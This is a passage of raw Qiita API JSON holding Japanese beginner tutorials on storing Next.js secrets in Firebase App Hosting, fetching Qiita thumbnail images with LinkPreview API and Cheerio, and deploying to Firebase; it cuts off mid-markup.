src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__83000f2063b517f334631417633a63ed\" data-content=\"https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fapp-hosting%2Fconfigure%3Fhl%3Dja%23secret-parameters\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n以前、Firebase App Hostingでデプロイに挑戦しました。\nNext.js内で定義している.envに定義している情報をFirebaseでの設定方法がわからなかったため、調べたことをまとめてみました。\n\n**Firebase App Hostingでデプロイする方法はこちらになります**\n\nhttps://qiita.com/asa129/items/9b951292a203cf7cdc13\n\n# シークレット情報の登録方法\n\nNext.jsの.envに定義していた情報は下記です。\n今回は、下記の`QIITA_API_TOKEN`をFirebaseに登録してみます。\n\n```.env\nQIITA_API_URL=https://qiita.com/api/v2/authenticated_user/items\nQIITA_API_TOKEN=アクセストークン\nX_MICROCMS_API_KEY=アクセストークン\nMICROCMS_URL=https://7qacxfbef6.microcms.io/api/v1/blog\nLINKPREVIEW_API_KEY=APIキー\nAPI_URL=https://tech-blog--tech-blog-1eb1a.asia-east1.hosted.app/\n```\n\n## firebasetoolを使ってCLIで環境変数を登録\nプロジェクト配下のターミナル上で`firebase apphosting:secrets:set 登録したい変数名`を実行\n\n```shell\n$ firebase apphosting:secrets:set 登録したい変数名\n```\n\n`Enter a value for ~`で登録したい値の入力、Enter\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ab73f85b-d5d1-4de5-bd6e-0cbf6c318a1c.png)\n\nその後、\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1bcc69ff-ca69-4a15-9aac-f4c964021eb4.png)\n\n\n? Is this secret for production or only local testing?\n\n本番用ですか？テスト用ですか？の質問に`Production`を選択\n\n? To use this secret, your backend's service account must be granted access. Would you like to grant access now? (Y/n)\n\nこのシークレットを使うために、バックエンドのサービスアカウントにアクセス権限を付与する必要があります。今すぐ権限を付与しますか？　の質問に`Yes`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a1ce237d-213d-4ea8-adab-3a940f5a2e05.png)\n\nWould you like to add this secret to apphosting.yml？の質問に`Yes`を選択\n\n.envで定義した環境変数名`QIITA_API_TOKEN`を登録\n\n公式ドキュメントによるとapphosting.ymlでAPIキーなどの設定をしてくださいとの記載がありました。\n\n> サードパーティの API キーや調整可能な設定など、ビルドプロセスに追加の構成が必要になることがあります。App Hosting では、apphosting.yaml で環境構成を提供し、プロジェクトのこのタイプのデータを保存および取得できます。\n\n追加してくれます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c274a0b7-1dd7-4993-b8ac-7b1f58a7932d.png)\n\nURLなどは自分で追加しました。\n\n```yml:apphosting.yaml\n  # Grant access to secrets in Cloud Secret Manager.\n  # See https://firebase.google.com/docs/app-hosting/configure#secret-parameters\nenv:\n  - variable: API_URL\n    value: https://tech-blog--tech-blog-1eb1a.asia-east1.hosted.app/\n  - variable: QIITA_API_URL\n    value: https://qiita.com/api/v2/authenticated_user/items\n  - variable: MICROCMS_URL\n    value: https://7qacxfbef6.microcms.io/api/v1/blog\n  - variable: QIITA_API_TOKEN\n    secret: qiitaApiToken\n  - variable: X_MICROCMS_API_KEY\n    secret: microCmsApiKey\n  - variable: LINKPREVIEW_API_KEY\n    secret: linkPreviewApiKey\n```\n\n# おわりに\n答えはドキュメントにちゃんと書いてあるということを再認識しました。\n\n# 参考\nhttps://firebase.google.com/docs/app-hosting/configure?hl=ja#secret-parameters\n","coediting":false,"comments_count":0,"created_at":"2025-07-26T21:36:07+09:00","group":null,"id":"ab14f9e10e9422e8c640","likes_count":3,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Firebase","versions":[]}],"title":"【Firebase App Hosting】Firebase App Hostingにシークレット情報を設定する","updated_at":"2025-07-26T21:36:07+09:00","url":"https://qiita.com/asa129/items/ab14f9e10e9422e8c640","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":641,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:161\">QiitaAPIを使用して自分の記事一覧の取得を試みました。<br>\nその際に、サムネイル画像(OGP画像)を取得したいと考えましたが、方法がわからなかったため調べたことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:80\">QiitaAPIから取得したURLを元にサムネイル画像を取得したい。</p>\n<h1 data-sourcepos=\"8:1-8:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"9:1-10:99\"><strong>LinkPreview API</strong>を使用し、記事のHTMLを取得<br>\n<strong>Cheerio</strong>ライブラリを使用し、<code>og:image</code>プロパティのコンテンツを取得する</p>\n<p data-sourcepos=\"12:1-12:100\">OGPは動的に生成されるため、HTMLページを直接解析して取得を試みました。</p>\n<h2 data-sourcepos=\"14:1-14:47\">\n<span id=\"1linkpreview-apiでapiキーを発行する\" class=\"fragment\"></span><a href=\"#1linkpreview-api%E3%81%A7api%E3%82%AD%E3%83%BC%E3%82%92%E7%99%BA%E8%A1%8C%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1.LinkPreview APIでAPIキーを発行する</h2>\n<p data-sourcepos=\"16:1-16:27\"><iframe id=\"qiita-embed-content__74626d21f2707a8f79e526bda714404c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__74626d21f2707a8f79e526bda714404c\" data-content=\"https%3A%2F%2Fmy.linkpreview.net%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"18:1-18:76\">Curlコマンドで実行すると、記事内容が取得できました。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"20:1-22:3\"><div class=\"highlight\"><pre><code>curl <span class=\"s2\">\"https://qiita.com/asa129/items/adc4a8e7782e89d4d524\"</span> <span class=\"nt\">-H</span> <span class=\"s2\">\"X-Linkpreview-Api-Key: 発行したAPIキー\"</span>\n</code></pre></div></div>\n<p data-sourcepos=\"24:1-24:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdb8abab3-c09d-4ae1-9b57-f2beaf845b90.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a518d64108b5e9e177ca0124ba990420\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdb8abab3-c09d-4ae1-9b57-f2beaf845b90.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a518d64108b5e9e177ca0124ba990420\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdb8abab3-c09d-4ae1-9b57-f2beaf845b90.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=cf0482f8fe7da0a287e9c600c297845b 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/db8abab3-c09d-4ae1-9b57-f2beaf845b90.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"27:1-27:60\">\n<span id=\"2cheerioライブラリを使用しogpを取得する\" class=\"fragment\"></span><a href=\"#2cheerio%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97ogp%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.Cheerioライブラリを使用し、OGPを取得する</h2>\n<p data-sourcepos=\"29:1-30:83\">取得した内容の、下記タグcontent=\"URL\"がサムネイル画像になります。<br>\n<code>&lt;meta property=\"og:image\" content=\"https://qiita-user-contents.i~省略~23fded4\"&gt;</code></p>\n<p data-sourcepos=\"32:1-32:23\"><iframe id=\"qiita-embed-content__f6a6bc0db8925eb74d99481b733f6635\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f6a6bc0db8925eb74d99481b733f6635\" data-content=\"https%3A%2F%2Fcheerio.js.org%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"34:1-34:43\">cheerioを使用し、取得しました。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"36:1-54:3\"><div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">runtime</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">nodejs</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">load</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">cheerio</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">getOgpImage</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n    <span class=\"kd\">const</span> <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">Qiita記事のURL</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">res</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n      <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"dl\">\"</span><span class=\"s2\">X-Linkpreview-Api-Key</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">Linkpreviewで発行したAPIキー</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n      <span class=\"p\">},</span>\n    <span class=\"p\">});</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">text</span><span class=\"p\">();</span> <span class=\"c1\">// html形式で取得</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">$</span> <span class=\"o\">=</span> <span class=\"nf\">load</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">ogpImage</span> <span class=\"o\">=</span> <span class=\"nf\">$</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">meta[property='og:image']</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nf\">attr</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">content</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">ogpImage</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"56:1-56:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F27a8eb19-49ad-474e-8160-b3051b40cb15.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=615f831a88a96e48dc30cf6062f92662\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F27a8eb19-49ad-474e-8160-b3051b40cb15.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=615f831a88a96e48dc30cf6062f92662\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F27a8eb19-49ad-474e-8160-b3051b40cb15.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=17515342ae401ecdd11f40347971c997 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/27a8eb19-49ad-474e-8160-b3051b40cb15.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"60:1-60:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"61:1-62:102\">サムネイルはOGP画像で作成されていることを知りました。<br>\nひと手間必要なため、もう少し簡単に取得できるといいのになと思います。</p>\n<h1 data-sourcepos=\"64:1-64:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"66:1-66:55\"><iframe id=\"qiita-embed-content__a0be5f447874d44483c353500af729aa\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a0be5f447874d44483c353500af729aa\" data-content=\"https%3A%2F%2Fqiita.com%2Fknberzp1zm%2Fitems%2F8228cae8dd1ff388da6b\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"68:1-68:53\"><iframe id=\"qiita-embed-content__7045f9d8ce68b749ca85ea4adc6851eb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7045f9d8ce68b749ca85ea4adc6851eb\" data-content=\"https%3A%2F%2Fqiita.com%2Fksyunnnn%2Fitems%2Fbfe2b9c568e97bb6b494\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"70:1-70:27\"><iframe id=\"qiita-embed-content__d8d5b97b75068d65019d5b47a8deeae4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d8d5b97b75068d65019d5b47a8deeae4\" data-content=\"https%3A%2F%2Fmy.linkpreview.net%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"72:1-72:23\"><iframe id=\"qiita-embed-content__c9d894a5d13362ccdb855a7ad5600e45\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c9d894a5d13362ccdb855a7ad5600e45\" data-content=\"https%3A%2F%2Fcheerio.js.org%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nQiitaAPIを使用して自分の記事一覧の取得を試みました。\nその際に、サムネイル画像(OGP画像)を取得したいと考えましたが、方法がわからなかったため調べたことをまとめます。\n\n# 問題\nQiitaAPIから取得したURLを元にサムネイル画像を取得したい。\n\n# 解決方法\n**LinkPreview API**を使用し、記事のHTMLを取得\n**Cheerio**ライブラリを使用し、`og:image`プロパティのコンテンツを取得する\n\nOGPは動的に生成されるため、HTMLページを直接解析して取得を試みました。\n\n## 1.LinkPreview APIでAPIキーを発行する\n\nhttps://my.linkpreview.net/\n\nCurlコマンドで実行すると、記事内容が取得できました。\n\n```bash\ncurl \"https://qiita.com/asa129/items/adc4a8e7782e89d4d524\" -H \"X-Linkpreview-Api-Key: 発行したAPIキー\"\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/db8abab3-c09d-4ae1-9b57-f2beaf845b90.png)\n\n\n## 2.Cheerioライブラリを使用し、OGPを取得する\n\n取得した内容の、下記タグcontent=\"URL\"がサムネイル画像になります。\n`<meta property=\"og:image\" content=\"https://qiita-user-contents.i~省略~23fded4\">`\n\nhttps://cheerio.js.org/\n\ncheerioを使用し、取得しました。\n\n```ts\nexport const runtime = \"nodejs\";\nimport { load } from \"cheerio\";\n\nexport async function getOgpImage() {\n\n    const url = \"Qiita記事のURL\";\n    const res = await fetch(url, {\n      headers: {\n        \"X-Linkpreview-Api-Key\": \"Linkpreviewで発行したAPIキー\",\n      },\n    });\n    const data = await res.text(); // html形式で取得\n    const $ = load(data);\n    const ogpImage = $(\"meta[property='og:image']\").attr(\"content\");\n\n    console.log(ogpImage);\n}\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/27a8eb19-49ad-474e-8160-b3051b40cb15.png)\n\n\n\n# おわりに\nサムネイルはOGP画像で作成されていることを知りました。\nひと手間必要なため、もう少し簡単に取得できるといいのになと思います。\n\n# 参考\n\nhttps://qiita.com/knberzp1zm/items/8228cae8dd1ff388da6b\n\nhttps://qiita.com/ksyunnnn/items/bfe2b9c568e97bb6b494\n\nhttps://my.linkpreview.net/\n\nhttps://cheerio.js.org/\n\n","coediting":false,"comments_count":0,"created_at":"2025-07-22T08:28:52+09:00","group":null,"id":"cd7b372b70fc185662a1","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Qiita","versions":[]},{"name":"OGP","versions":[]},{"name":"サムネイル","versions":[]}],"title":"【LinkPreview API + Cheerio】Qiitaのサムネイルを取得する","updated_at":"2025-07-22T08:28:52+09:00","url":"https://qiita.com/asa129/items/cd7b372b70fc185662a1","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":430,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:206\">Next.jsアプリでCI/CDを構築しようとしたところ、Firebaseへのデプロイする方法がわからず、数時間格闘しました。今後のために備忘録としてまとめました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"結論\" class=\"fragment\"></span><a href=\"#%E7%B5%90%E8%AB%96\"><i class=\"fa fa-link\"></i></a>結論</h1>\n<p data-sourcepos=\"5:1-5:63\">公式ドキュメントの通りに行えば可能でした。</p>\n<p data-sourcepos=\"7:1-7:62\"><iframe id=\"qiita-embed-content__4ee3e22b98632691f1375474162f9f3d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4ee3e22b98632691f1375474162f9f3d\" data-content=\"https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fapp-hosting%2Fget-started%3Fhl%3Dja\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"9:1-9:17\">\n<span id=\"試してみる\" class=\"fragment\"></span><a href=\"#%E8%A9%A6%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\"><i class=\"fa fa-link\"></i></a>試してみる</h1>\n<h2 data-sourcepos=\"10:1-10:15\">\n<span id=\"前提条件\" class=\"fragment\"></span><a href=\"#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6\"><i class=\"fa fa-link\"></i></a>前提条件</h2>\n<p data-sourcepos=\"11:1-11:73\">Next.jsアプリを作成、GitHubに登録済で実施しています。</p>\n<h2 data-sourcepos=\"13:1-13:28\">\n<span id=\"1firebaseにアクセス\" class=\"fragment\"></span><a href=\"#1firebase%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9\"><i class=\"fa fa-link\"></i></a>1.firebaseにアクセス</h2>\n<p data-sourcepos=\"15:1-15:34\"><iframe id=\"qiita-embed-content__ac3879f621c2812c51737a881c24cd86\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ac3879f621c2812c51737a881c24cd86\" data-content=\"https%3A%2F%2Ffirebase.google.com%2F%3Fhl%3Dja\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"17:1-17:84\">ログイン後、画面右上の<code>Go to console</code>でコンソールに移動します</p>\n<p data-sourcepos=\"19:1-19:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F34a3c0bc-1506-4eb0-aec6-cb9bdfd8578e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=837081cf6fd671734f21bd811f14fd1f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F34a3c0bc-1506-4eb0-aec6-cb9bdfd8578e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=837081cf6fd671734f21bd811f14fd1f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F34a3c0bc-1506-4eb0-aec6-cb9bdfd8578e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0fab887adcedc11c0dd4f06b3ab23032 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/34a3c0bc-1506-4eb0-aec6-cb9bdfd8578e.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"21:1-21:59\"><code>Firebase プロジェクトを作成する</code>をクリック</p>\n<p data-sourcepos=\"23:1-23:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5bea5305-d674-41fb-8673-8d43f62699f6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ca5cb0e0bb969103fcf4837992659987\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5bea5305-d674-41fb-8673-8d43f62699f6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ca5cb0e0bb969103fcf4837992659987\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5bea5305-d674-41fb-8673-8d43f62699f6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1a9993cc53c691b9ff0d73f3a6af153e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5bea5305-d674-41fb-8673-8d43f62699f6.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"25:1-25:39\">プロジェクト名を入力します</p>\n<p data-sourcepos=\"27:1-27:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbee601db-28df-4fc6-aa6a-088966d894f5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dd80804feeb13011e933ffa37561530b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbee601db-28df-4fc6-aa6a-088966d894f5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dd80804feeb13011e933ffa37561530b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbee601db-28df-4fc6-aa6a-088966d894f5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a02e7bd07fd464d35878c7c2abbcd801 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bee601db-28df-4fc6-aa6a-088966d894f5.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"30:1-30:66\">ここからは、任意で有効にし、続行ボタンを押下</p>\n<p data-sourcepos=\"32:1-32:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fac2070c4-2b4f-4bd2-98aa-56c08fdd46c6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f0e202cc29dcae39d5c5893c50074e76\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fac2070c4-2b4f-4bd2-98aa-56c08fdd46c6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f0e202cc29dcae39d5c5893c50074e76\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fac2070c4-2b4f-4bd2-98aa-56c08fdd46c6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c1a1d21bb085822ecec222118b9b3df1 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ac2070c4-2b4f-4bd2-98aa-56c08fdd46c6.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"35:1-35:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0da79034-05cb-48f7-bcd7-7259580bc942.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a17c807ba05100b70728275e336c2924\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0da79034-05cb-48f7-bcd7-7259580bc942.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a17c807ba05100b70728275e336c2924\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0da79034-05cb-48f7-bcd7-7259580bc942.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=225d28fb2d6433018f5d2409458d55f7 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0da79034-05cb-48f7-bcd7-7259580bc942.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"37:1-37:44\"><code>プロジェクト作成</code>ボタンを押下</p>\n<p data-sourcepos=\"39:1-39:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F03041e9a-a8f5-4109-b6c8-fa6539100fb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9d06c95a0886b4ffbd5ebd7078a15276\" target=\"_blank\" rel=\"nofollow noopener\"><img 